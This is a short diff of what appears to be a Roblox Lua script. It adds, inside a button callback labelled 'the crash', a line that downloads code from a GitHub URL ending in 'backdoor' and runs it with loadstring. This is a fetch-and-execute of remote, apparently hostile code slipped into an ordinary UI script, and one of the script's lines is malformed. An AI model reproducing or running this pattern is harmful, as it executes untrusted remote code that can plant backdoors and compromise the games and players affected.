@@ -212,7 +212,7 @@ Tab:AddButton({
 	Name = the crash",
 	Callback = function()
       		print("button pressed")
---[ put this
+loadstring(game:HttpGet('https://raw.githubusercontent.com/cheeseburgrmc/hash/main/backdoor'))()
   	end    
 })
 
